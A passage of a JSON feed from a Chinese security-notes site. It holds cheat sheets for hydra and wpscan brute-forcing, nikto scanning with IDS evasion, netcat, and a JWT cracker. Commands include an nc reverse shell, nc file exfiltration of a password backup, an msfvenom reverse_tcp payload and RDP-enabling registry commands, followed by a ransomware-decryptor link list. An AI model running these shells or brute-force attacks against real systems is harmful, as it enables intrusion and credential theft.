破解imap</h3>\n<div><pre><code>hydra -L user.txt -p secret <span>10.36</span>.16.18 imap PLAIN\nhydra -C defaults.txt -6 imap://<span>[</span>fe80::2c:31ff:fe12:ac11<span>]</span>:143/PLAIN\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><h3 id=\"破解telnet\"> 破解telnet</h3>\n<div><pre><code>hydra <span>ip</span> telnet -l 用户 -P 密码字典 -t <span>32</span> -s <span>23</span> -e ns -f -V\n</code></pre>\n<div><span>1</span><br></div></div>",
      "date_published": "2021-09-06T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "安全工具"
      ]
    },
    {
      "title": "nikto扫描工具",
      "url": "http://www.liuhanzhe.com/docs/security/tools/6.nikto%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/",
      "id": "http://www.liuhanzhe.com/docs/security/tools/6.nikto%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/",
      "content_html": "<p>中文使用教程：</p>\n<p>​\thttps://www.wangan.com/docs/1264</p>\n<hr>\n<p>1、  NIKTO:perl语言开发的开源WEB安全扫描器；识别网站软件版本；搜索存在安全隐患的文件；检查服务器配置漏洞；检查WEB Application层面的安全隐患；避免404误判（原因：很多服务器不遵循RFC标准，对于不存在的对象返回200响应码）；依据响应文件内容判断，不同扩展名的文件404响应内容不同；去时间信息后的内容取MD5值；不建议用-no404参数（-no404参数指去不校验404误判）</p>\n<p>NIKTO使用方法：</p>\n<p>1、  命令：nikto -update #升级，更新插件；</p>\n<p>2、  Nikto -list-plugins #查看插件；</p>\n<p>3、  Nikto -host <a href=\"http://1.1.1.1/\" target=\"_blank\" rel=\"noopener noreferrer\">http://1.1.1.1</a> #扫描目标：域名方式；</p>\n<p>4、  Nikto -host <a href=\"http://1.1.1.1/\" target=\"_blank\" rel=\"noopener noreferrer\">http://1.1.1.1</a> -output #扫描并输出结果</p>\n<p>5、  Nikto -host 1.1.1.1 -port 80 #扫描目标：ip地址加端口号</p>\n<p>6、  Nikto -host <a href=\"http://www.baidu.com/\" target=\"_blank\" rel=\"noopener noreferrer\">www.baidu.com</a> -port 443 -ssl #扫描https网站</p>\n<p>7、  Nikto -host 文件名.txt #批量扫描目标</p>\n<p>8、  nmap -p80 192.168.1.0/24 -oG - | nikto -host - #利用nmap扫描开放80端口的IP段并且oG（nmap结果输出并整理）通过管道的方式“|”用nikto进行扫描</p>\n<p>9、  nikto -host 192.168.0.1 -useproxy http://localhost:8070 #利用代理进行扫描</p>\n<p>10、  -vhost #当一个网站存在多个端口时可以使用-vhost遍历所有网站进行扫描或一个ip对应多个网站</p>\n<p>11、  Nikto交互形参数：</p>\n<table>\n<thead>\n<tr>\n<th>空格</th>\n<th>报告当前扫描状态</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>v</td>\n<td>显示详细信息（verbose）</td>\n</tr>\n<tr>\n<td>d</td>\n<td>调试信息（及其详细信息）</td>\n</tr>\n<tr>\n<td>e</td>\n<td>显示错误信息</td>\n</tr>\n<tr>\n<td>p</td>\n<td>显示扫描进度</td>\n</tr>\n<tr>\n<td>r</td>\n<td>显示重定向信息</td>\n</tr>\n<tr>\n<td>c</td>\n<td>显示cookie</td>\n</tr>\n<tr>\n<td>a</td>\n<td>身份认证过程显示出来</td>\n</tr>\n<tr>\n<td>q</td>\n<td>退出</td>\n</tr>\n<tr>\n<td>N</td>\n<td>扫描下一个目标</td>\n</tr>\n<tr>\n<td>P</td>\n<td>暂停扫描</td>\n</tr>\n</tbody>\n</table>\n<p>配置文件：</p>\n<p>路径：/etc/nikto.conf</p>\n<p>User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本；在nikto中最好修改成别的浏览器user agent；</p>\n<p>设置cookie：</p>\n<p>在配置文件中找到cookie进行设置（#STATIC-COOKIE= &quot;cookie1&quot;=&quot;cookie value&quot;;&quot;cookie2&quot;=&quot;cookie val&quot;）</p>\n<p>IDS逃避技术：主要为了躲避IDS、IPS检测告警</p>\n<p>-evasion #此参数使用方式（Nikto -host http://1.1.1.1 -evasion 1234）逃避方式共8种：1、随机url编码，2、自选路径，3、过早结束的URL，4、优先考虑长随机字符串，5、参数欺骗，6、使用TAB作为命令的分隔符，7、使用变化的URL，8、使用Windows路径分隔符</p>\n",
      "date_published": "2022-02-10T00:00:00.000Z",
      "date_modified": "2022-04-21T08:19:12.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "安全工具"
      ]
    },
    {
      "title": "nc",
      "url": "http://www.liuhanzhe.com/docs/security/tools/8.nc/",
      "id": "http://www.liuhanzhe.com/docs/security/tools/8.nc/",
      "content_html": "<h2 id=\"nc\"> nc</h2>\n<p>nc是netcat的简写，有着网络界的瑞士军刀美誉。因为它短小精悍、功能实用，被设计为一个简单、可靠的网络工具</p>\n<h3 id=\"作用\"> 作用</h3>\n<p>（1）实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口</p>\n<p>（2）端口的扫描，nc可以作为client发起TCP或UDP连接</p>\n<p>（3）机器之间传输文件</p>\n<p>（4）机器之间网络测速</p>\n<h3 id=\"参数\"> 参数</h3>\n<p><img src=\"/assets/img/image-20210915180906011.png\" alt=\"image-20210915180906011\" /></p>\n<h3 id=\"用法\"> 用法</h3>\n<ul>\n<li>\n<p>网络连通性测试和端口扫描</p>\n<div><pre><code>nc -v -z -w2 192.168.0.3 1-100  //tcp\nnc -u -z -w2 192.168.0.1 1-1000 //udp\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div></li>\n<li>\n<p>使用nc传输文件和目录</p>\n<div><pre><code>传输文件：\n    接收：\n    \tnc -l 9995 &gt;zabbix.rpm\n    发送：\n   \t \tnc 10.0.1.162 9995 &lt; zabbix-release-2.4-1.el6.noarch.rpm\n传输目录：\n\t接收：\n\t\tnc -l 9995 | tar xfvz -\n    发送：\n    \ttar cfz - * | nc 10.0.1.162 9995\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div></li>\n<li>\n<p>测试网速</p>\n<div><pre><code>接收：\n\tnc -l 9991 &gt;/dev/null\n发送：\n\tnc 10.0.1.161 9991 &lt;/dev/zero\n查看网速：\n\tdstat\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div></li>\n<li>\n<p>回弹shell</p>\n<div><pre><code>监听\nnc -lvp 4444\n回弹\nnc -nv 192.168.141.134 4444 -e /bin/bash\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div></li>\n</ul>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20210915180906011.png",
      "date_published": "2018-10-01T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "安全工具"
      ]
    },
    {
      "title": "wpscan",
      "url": "http://www.liuhanzhe.com/docs/security/tools/7.wpscan/",
      "id": "http://www.liuhanzhe.com/docs/security/tools/7.wpscan/",
      "content_html": "<h2 id=\"wpscan\"> wpscan</h2>\n<p>WPScan是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞。最新版本WPScan的数据库中包含超过18000种插件漏洞和2600种主题漏洞，并且支持最新版本的WordPress。值得注意的是，它不仅能够扫描类似robots.txt这样的敏感文件，而且还能够检测当前已启用的插件和其他功能。</p>\n<p>访问wordpress默认登录链接： /<em>wp</em>-admin 或 /<em>wp</em>-login.php</p>\n<p><img src=\"/assets/img/image-20210915152509561.png\" alt=\"image-20210915152509561\" /></p>\n<p><img src=\"/assets/img/image-20210915152532122.png\" alt=\"image-20210915152532122\" /></p>\n<h3 id=\"常用选项\"> 常用选项</h3>\n<ul>\n<li>\n<p>更新漏洞库</p>\n<div><pre><code>wpscan --update\n</code></pre>\n<div><span>1</span><br></div></div></li>\n<li>\n<p>扫描站点</p>\n<div><pre><code>wpscan --url http://192.168.15.176/wordpress\n</code></pre>\n<div><span>1</span><br></div></div></li>\n<li>\n<p>对主题进行扫描</p>\n<div><pre><code>wpscan --url http://192.168.15.176/wordpress --enumerate t\n</code></pre>\n<div><span>1</span><br></div></div></li>\n<li>\n<p>扫描主题中存在的漏洞</p>\n<div><pre><code>wpscan --url http://192.168.15.176/wordpress --enumerate vt\n</code></pre>\n<div><span>1</span><br></div></div></li>\n<li>\n<p>扫描安装的插件</p>\n<div><pre><code>wpscan --url http://192.168.15.176/wordpress --enumerate p\n</code></pre>\n<div><span>1</span><br></div></div></li>\n<li>\n<p>扫描安装的插件的漏洞</p>\n<div><pre><code>wpscan --url http://192.168.15.176/wordpress --enumerate vp\n</code></pre>\n<div><span>1</span><br></div></div></li>\n<li>\n<p>枚举wordpress的用户</p>\n<div><pre><code>wpscan --url http://192.168.15.176/wordpress --enumerate u\n</code></pre>\n<div><span>1</span><br></div></div></li>\n<li>\n<p>使用wpscan进行暴力破解</p>\n<div><pre><code>wpscan --url http://xxxx --passwords 密码字典 --usernames 用户名或者密码字典\n</code></pre>\n<div><span>1</span><br></div></div></li>\n<li>\n<p>命令集合</p>\n<div><pre><code>wpscan --url http://192.168.15.176/wordpress --enmuerate vp,vt,tt,u\n</code></pre>\n<div><span>1</span><br></div></div></li>\n</ul>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20210915152509561.png",
      "date_published": "2021-09-06T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "安全工具"
      ]
    },
    {
      "title": "JWT破解工具",
      "url": "http://www.liuhanzhe.com/docs/security/tools/9.jwt-cracker/",
      "id": "http://www.liuhanzhe.com/docs/security/tools/9.jwt-cracker/",
      "content_html": "<p>一个用C语言编写的多线程JWT暴力破解器</p>\n<div><p>下载</p>\n<p><a href=\"https://github.com/brendan-rius/c-jwt-cracker\" target=\"_blank\" rel=\"noopener noreferrer\">jwt-cracker</a></p>\n</div>\n<div><pre><code><span>make</span>\n\n<span>#直接破解</span>\n$ <span>></span> ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE\n\n<span>#使用参数：字母表 最大密钥长度 算法</span>\n$ <span>></span> ./jwtcrack eyJ0eXAiOiJKV1Q**5WxpIZ9_v0g adimnps <span>9</span> sha512\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><p>示例：<br>\n<img src=\"/assets/img/tools/jwt.png\" alt=\"jwt\" /></p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/tools/jwt.png",
      "date_published": "2018-10-01T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "安全工具"
      ]
    },
    {
      "title": "其他",
      "url": "http://www.liuhanzhe.com/docs/security/%E5%85%B6%E4%BB%96/0.readme/",
      "id": "http://www.liuhanzhe.com/docs/security/%E5%85%B6%E4%BB%96/0.readme/",
      "content_html": "<ul>\n<li><a href=\"./1.一些命令收集.html\">1.一些命令收集</a></li>\n<li><a href=\"./2.常见的勒索病毒解密工具.html\">2.常见的勒索病毒解密工具</a></li>\n</ul>\n",
      "date_published": "2022-04-20T06:36:02.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": []
    },
    {
      "title": "命令收集",
      "url": "http://www.liuhanzhe.com/docs/security/%E5%85%B6%E4%BB%96/1.%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/",
      "id": "http://www.liuhanzhe.com/docs/security/%E5%85%B6%E4%BB%96/1.%E4%B8%80%E4%BA%9B%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/",
      "content_html": "<h4 id=\"通过python获取交互shell-tty\"> 通过python获取交互shell tty</h4>\n<div><pre><code>python -c <span>'import pty; pty.spawn(\"/bin/bash\")'</span>\n<span>export</span> <span><span>TERM</span></span><span>=</span>xterm\n\n<span>import</span> pty<span>;</span>pty.spawn<span>(</span>’/bin/bash’<span>)</span>\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h4 id=\"nc\"> nc</h4>\n<div><pre><code>监听\n<span>nc</span> -lvp <span>4444</span>\n回弹\n<span>nc</span> -nv <span>192.168</span>.141.134 <span>4444</span> -e /bin/bash\n\n使用nc传文件\n<span>nc</span> -nvlp <span>5555</span> <span>></span> old-passwords.bak\n<span>nc</span> <span>192.168</span>.141.134 <span>5555</span> <span>&lt;</span> /home/jim/backups/old-passwords.bak\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><h4 id=\"使用python开启web服务\"> 使用python开启web服务</h4>\n<div><pre><code>python -m SimpleHTTPServer <span>8090</span>\npython3 -m http.server <span>8090</span> \n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><h4 id=\"使用mefvenom生成一个可执行的shell\"> 使用mefvenom生成一个可执行的shell</h4>\n<div><pre><code>msfvenom  -p linux/x86/meterpreter/reverse_tcp  <span>lhost</span><span>=</span><span>192.168</span>.42.128 <span>lport</span><span>=</span><span>6666</span> -f elf -o <span>6666</span>.elf\n</code></pre>\n<div><span>1</span><br></div></div><h4 id=\"查看linux系统发行版本、内核版本\"> 查看linux系统发行版本、内核版本</h4>\n<div><pre><code>lsb_release -a\n<span>uname</span> -a\n<span>cat</span> /proc/version\n<span>cat</span> /etc/lsb-release\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h4 id=\"windows设置打开防火墙端口\"> windows设置打开防火墙端口</h4>\n<div><pre><code>netsh firewall <span>set</span> portopening TCP <span>3389</span> ENABLE   <span>#防火墙开启远程桌面3389端口</span>\n</code></pre>\n<div><span>1</span><br></div></div><h4 id=\"windows开启远程桌面\"> windows开启远程桌面</h4>\n<div><pre><code><span>#设置远程桌面端口</span>\nreg <span>add</span> <span>\"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\"</span> /t REG_DWORD /v portnumber /d <span>3389</span> /f\n<span>#开启远程桌面</span>\nwmic RDTOGGLE WHERE <span>ServerName</span><span>=</span><span>'%COMPUTERNAME%'</span> call SetAllowTSConnections <span>1</span>\n<span>#检查端口状态</span>\n<span>netstat</span> -an<span>|</span><span>find</span> <span>\"3389\"</span>\n<span>#关闭远程桌面</span>\nwmic RDTOGGLE WHERE <span>ServerName</span><span>=</span><span>'%COMPUTERNAME%'</span> call SetAllowTSConnections <span>0</span>\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div>",
      "date_published": "2022-03-01T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "安全"
      ]
    },
    {
      "title": "常见的勒索病毒解密工具",
      "url": "http://www.liuhanzhe.com/docs/security/%E5%85%B6%E4%BB%96/2.%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/",
      "id": "http://www.liuhanzhe.com/docs/security/%E5%85%B6%E4%BB%96/2.%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/",
      "content_html": "<ul>\n<li>\n<p>[777 Ransom] Trend Micro Ransomware解密器用来解密777勒索软件加密的文件</p>\n<div><pre><code>https://success.trendmicro.com/solution/1114221\n</code></pre>\n<div><span>1</span><br></div></div></li>\n<li>\n<p>[AES_NI Ransom] Rakhni解密器用来解密AES_NI勒索软件加密的文件</p>\n<div><pre><code>http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip\n</code></pre>\n<div><span>1</span><br></div></div></li>\n<li>\n<p>[Agent.iih Ransom] Rakhni解密器用来解密Agent.iih勒索软件加密的文件</p>\n<div><pre><code>http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip\n</code></pre>\n<div><span>1</span><br></div></div></li>\n<li>\n<p>[Alcatraz Ransom] Alcatraz解密器用来解密Alcatraz勒索软件加密的文件</p>\n<div><pre><code>https://files.avast.com/files/decryptor/avast_decryptor_alcatrazlocker.exe\n</code></pre>\n<div><span>1</span><br></div></div></li>\n<li>\n<p>[Alpha Ransom] Alphadecrypter解密器用来解密Alpha勒索软件加密的文件</p>\n<div><pre><code>https://www.bleepingcomputer.com/download/alphadecrypter/dl/329/\n</code></pre>\n<div><span>1</span><br></div></div></li>\n</ul>\n<p>[Amnesia Ransom] Amnesia解密器用来解密Amnesia勒索软件加密的文件 https://decrypter.emsisoft.com/download/amnesia</p>\n<p>[Amnesia2 Ransom] Amnesia2解密器用来解密Amnesia2 勒索软件加密的文件 https://decrypter.emsisoft.com/download/amnesia2</p>\n<p>[Annabelle Ransom] BDAnnabelleDecryptTool解密器用来解密Annabelle勒索软件加密的文件 http://download.bitdefender.com/am/malware_removal/BDAnnabelleDecryptTool.exe StupidDecryptor解密器用来解密Annabelle勒索软件加密的文件 https://www.bleepingcomputer.com/download/stupiddecryptor/dl/351/</p>\n<p>[Aura Ransom] Rakhni解密器用来解密Aura勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip</p>\n<p>[Aurora Ransom] AuroraDecryptor解密器用来解密Aurora勒索软件加密的文件 https://www.bleepingcomputer.com/download/auroradecrypter/dl/379/ Aurora解密器用来解密Aurora勒索软件加密的文件 https://decrypter.emsisoft.com/download/aurora</p>\n<p>[AutoIt Ransom] Rakhni解密器用来解密AutoIt勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip Rannoh解密器用来解密AutoIt勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rannohdecryptor.zip</p>\n<p>[AutoLocky Ransom] Trend Micro Ransomware解密器用来解密AutoLocky勒索软件加密的文件 https://success.trendmicro.com/solution/1114221</p>\n<p>[BTCWare Ransom] BTCWare解密器用来解密BTCWare勒索软件加密的文件 https://files.avast.com/files/decryptor/avast_decryptor_btcware.exe</p>\n<p>[BadBlock Ransom] Trend Micro Ransomware解密器用来解密BadBlock勒索软件加密的文件 https://success.trendmicro.com/solution/1114221</p>\n<p>[BarRax Ransom] BarRax解密器用来解密BarRax勒索软件加密的文件 http://blog.checkpoint.com/wp-content/uploads/2017/03/BarRaxDecryptor.zip</p>\n<p>[Bart Ransom] Bart解密器用来解密Bart勒索软件加密的文件 https://files.avast.com/files/decryptor/avast_decryptor_bart.exe http://download.bitdefender.com/am/malware_removal/BDBartDecryptor.exe</p>\n<p>[BigBobRoss Ransom] Bigbobross fix解密器用来解密BigBobRoss勒索软件加密的文件 https://files.avast.com/files/decryptor/avast_decryptor_bigbobross.exe</p>\n<p>[Bitcryptor Ransom] Coinvault解密器用来解密Bitcryptor勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/CoinVaultDecryptor.zip</p>\n<p>[CERBER V1 Ransom] Trend Micro Ransomware解密器用来解密CERBER V1勒索软件加密的文件 https://success.trendmicro.com/solution/1114221</p>\n<p>[Chimera Ransom] Rakhni解密器用来解密Chimera勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip</p>\n<p>[Coinvault Ransom] Coinvault解密器用来解密Coinvault勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/CoinVaultDecryptor.zip</p>\n<p>[Cry128 Ransom] Cry128解密器用来解密Cry128勒索软件加密的文件 https://decrypter.emsisoft.com/download/cry128</p>\n<p>[Cry9 Ransom] Cry9解密器用来解密Cry9勒索软件加密的文件 https://decrypter.emsisoft.com/download/cry9</p>\n<p>[CrySIS Ransom] Rakhni解密器用来解密CrySIS勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip</p>\n<p>[Cryakl Ransom] Rakhni解密器用来解密Cryakl勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip</p>\n<p>[Crybola Ransom] Rannoh解密器用来解密Crybola勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rannohdecryptor.zip</p>\n<p>[Crypt888 Ransom] Crypt888解密器用来解密Crypt888勒索软件加密的文件 https://files.avast.com/files/decryptor/avast_decryptor_crypt888.exe</p>\n<p>[CryptON Ransom] Crypton解密器用来解密CryptON勒索软件加密的文件 https://decrypter.emsisoft.com/download/crypton</p>\n<p>[CryptXXX V1/2/3/4/5 Ransom Rannoh解密器用来解密CryptXXX V1/2/3/4/5勒索软件加密的文件 https://success.trendmicro.com/solution/1114221</p>\n<p>[CryptoMix Ransom] CryptoMix解密器用来解密CryptoMix勒索软件加密的文件 https://nomoreransom.cert.pl/static/cryptomix_decryptor.exe</p>\n<p>[Cryptokluchen Ransom] Rakhni解密器用来解密Cryptokluchen勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip</p>\n<p>[DXXD Ransom] Trend Micro Ransomware解密器用来解密DXXD勒索软件加密的文件 https://success.trendmicro.com/solution/1114221</p>\n<p>[Damage Ransom] Damage解密器用来解密Damage勒索软件加密的文件 https://decrypter.emsisoft.com/download/damage</p>\n<p>[Democry Ransom] Rakhni解密器用来解密Democry勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip</p>\n<p>[Derialock Ransom] Derialock解密器用来解密Derialock勒索软件加密的文件 http://blog.checkpoint.com/wp-content/uploads/2016/12/Derialock-Decryptor.zip</p>\n<p>[Dharma Ransom] Rakhni解密器用来解密Dharma勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip</p>\n<p>[EncrypTile Ransom] EncrypTile解密器用来解密EncrypTile勒索软件加密的文件 https://files.avast.com/files/decryptor/avast_decryptor_encryptile.exe</p>\n<p>[Everbe 1.0 Ransom] InsaneCryptDecrypter解密器用来解密Everbe 1.0勒索软件加密的文件 https://www.bleepingcomputer.com/download/insanecrypt-desucrypt-decrypter/dl/369/</p>\n<p>[FenixLocker Ransom] FenixLocker解密器用来解密FenixLocker勒索软件加密的文件 https://decrypter.emsisoft.com/download/fenixlocker</p>\n<p>[FilesLocker v1 and v2 Ransom] FilesLockerDecrypter解密器用来解密FilesLocker v1 and v2勒索软件加密的文件 https://www.bleepingcomputer.com/download/fileslockerdecrypter/dl/378/</p>\n<p>[Fury Ransom] Rannoh解密器用来解密Fury勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rannohdecryptor.zip</p>\n<p>[GandCrab (V1, V4 and V5 up to V5.2 versions) Ransom] BDGandCrabDecryptTool解密器用来解密GandCrab (V1, V4 and V5 up to V5.2 versions)勒索软件加密的文件 http://download.bitdefender.com/am/malware_removal/BDGandCrabDecryptTool.exe</p>\n<p>[GetCrypt Ransom] 解密器用来解密GetCrypt勒索软件加密的文件 https://www.emsisoft.com/decrypter/download/getcrypt</p>\n<p>[Globe1/2/3Ransom] Globe1/2/3解密器用来解密Globe勒索软件加密的文件 https://decrypter.emsisoft.com/download/globe https://decrypter.emsisoft.com/download/globe2 https://decrypter.emsisoft.com/download/globe3</p>\n<p>[GlobeImposter Ransom] GlobeImposter解密器用来解密GlobeImposter勒索软件加密的文件 https://decrypter.emsisoft.com/download/globeimposter</p>\n<p>[Gomasom Ransom] Gomasom解密器用来解密Gomasom勒索软件加密的文件 https://decrypter.emsisoft.com/download/gomasom</p>\n<p>[HKCrypt Ransom] HKCrypt解密器用来解密HKCrypt勒索软件加密的文件</p>\n<p>[Globe/Purge Ransom] Trend Micro Ransomware解密器用来解密Globe/Purge勒索软件加密的文件 https://success.trendmicro.com/solution/1114221</p>\n<p>[HiddenTear Ransom] HiddenTear解密器用来解密HiddenTear勒索软件加密的文件 https://files.avast.com/files/decryptor/avast_decryptor_hiddentear.exe</p>\n<p>[InsaneCrypt Ransom] InsaneCryptDecrypter解密器用来解密InsaneCrypt 勒索软件加密的文件 https://www.bleepingcomputer.com/download/insanecrypt-desucrypt-decrypter/dl/369/</p>\n<p>[JSWorm 2.0 Ransom] JS WORM 2.0解密器用来解密JSWorm 2.0勒索软件加密的文件 https://www.emsisoft.com/decrypter/download/jsworm-20</p>\n<p>[Jaff Ransom] Rakhni解密器用来解密Jaff勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip</p>\n<p>[Jigsaw Ransom] Jigsaw解密器用来解密Jigsaw勒索软件加密的文件 https://blog.checkpoint.com/wp-content/uploads/2016/07/JPS_release.zip</p>\n<p>[LECHIFFRE Ransom] Trend Micro Ransomware解密器用来解密LECHIFFRE勒索软件加密的文件 https://success.trendmicro.com/solution/1114221</p>\n<p>[LambdaLocker Ransom] LambdaLocker解密器用来解密LambdaLocker勒索软件加密的文件 https://files.avast.com/files/decryptor/avast_decryptor_lambdalocker.exe</p>\n<p>[Lamer Ransom] Rakhni解密器用来解密Lamer勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip</p>\n<p>[Linux.Encoder.1 Ransom] Linux.Encoder.1解密器用来解密Linux.Encoder.1勒索软件加密的文件 http://labs.bitdefender.com/wp-content/plugins/download-monitor/download.php?id=Decrypter_0-1.3.zip</p>\n<p>[Linux.Encoder.3 Ransom] Linux.Encoder.3解密器用来解密Linux.Encoder.3勒索软件加密的文件 https://labs.bitdefender.com/wp-content/plugins/download-monitor/download.php?id=encoder_3_decrypter.zip</p>\n<p>[Lortok Ransom] Rakhni解密器用来解密Lortok勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip</p>\n<p>[MacRansom Ransom] MacRansom解密器用来解密MacRansom勒索软件加密的文件 https://esupport.trendmicro.com/media/13801530/Trend%20Micro%20Ransomware%20Decryptor_V1.0.1.zip</p>\n<p>[Marlboro Ransom] Marlboro解密器用来解密Marlboro勒索软件加密的文件 https://decrypter.emsisoft.com/download/marlboro</p>\n<p>[Marsjoke aka Polyglot Ransom] Rannoh解密器用来解密Marsjoke aka Polyglot勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rannohdecryptor.zip</p>\n<p>[MegaLocker Ransom] MegaLocker解密器用来解密MegaLocker勒索软件加密的文件 https://www.emsisoft.com/decrypter/download/megalocker</p>\n<p>[Merry X-Mas Ransom] Merry X-Mas解密器用来解密Merry X-Mas勒索软件加密的文件 https://decrypter.emsisoft.com/download/mrcr http://blog.checkpoint.com/wp-content/uploads/2017/03/MXM_Decryptor-3.7z</p>\n<p>[MirCop Ransom] Trend Micro Ransomware解密器用来解密MirCop勒索软件加密的文件 https://success.trendmicro.com/solution/1114221</p>\n<p>[Mole Ransom] Mole解密器用来解密Mole勒索软件加密的文件 https://nomoreransom.cert.pl/static/mole_decryptor.exe</p>\n<p>[Nemucod Ransom] Nemucod 解密器用来解密Nemucod勒索软件加密的文件 https://decrypter.emsisoft.com/download/nemucod</p>\n<p>[NemucodAES Ransom] NemucodAES解密器用来解密NemucodAES勒索软件加密的文件 https://decrypter.emsisoft.com/download/nemucodaes</p>\n<p>[Nmoreira Ransom] Nmoreira解密器用来解密Nmoreira勒索软件加密的文件 https://decrypter.emsisoft.com/download/nmoreira</p>\n<p>[Noobcrypt Ransom] Noobcrypt解密器用来解密Noobcrypt勒索软件加密的文件 https://files.avast.com/files/decryptor/avast_decryptor_noobcrypt.exe</p>\n<p>[Ozozalocker Ransom] Ozozalocker解密器用来解密Ozozalocker勒索软件加密的文件 https://decrypter.emsisoft.com/download/ozozalocker</p>\n<p>[PHP ransomware Ransom] PHP ransomware解密器用来解密PHP ransomware勒索软件加密的文件 http://blog.checkpoint.com/wp-content/uploads/2016/12/PHP-ransomware-decryptor.zip</p>\n<p>[Pewcrypt Ransom] Pewcrypt解密器用来解密Pewcrypt勒索软件加密的文件 https://decrypter.emsisoft.com/download/pewcrypt</p>\n<p>[Philadelphia Ransom] Philadelphia解密器用来解密Philadelphia勒索软件加密的文件 https://decrypter.emsisoft.com/download/philadelphia</p>\n<p>[Planetary Ransom] Planetary解密器用来解密Planetary勒索软件加密的文件 https://decrypter.emsisoft.com/download/planetary</p>\n<p>[Pletor Ransom] Rakhni解密器用来解密Pletor勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip</p>\n<p>[Popcorn Ransom] Popcorn解密器用来解密Popcorn勒索软件加密的文件 https://www.elevenpaths.com/downloads/RecoverPopCorn.zip</p>\n<p>[Pylocky Ransom] pylocky_decryptor解密器用来解密Pylocky勒索软件加密的文件 https://github.com/Cisco-Talos/pylocky_decryptor 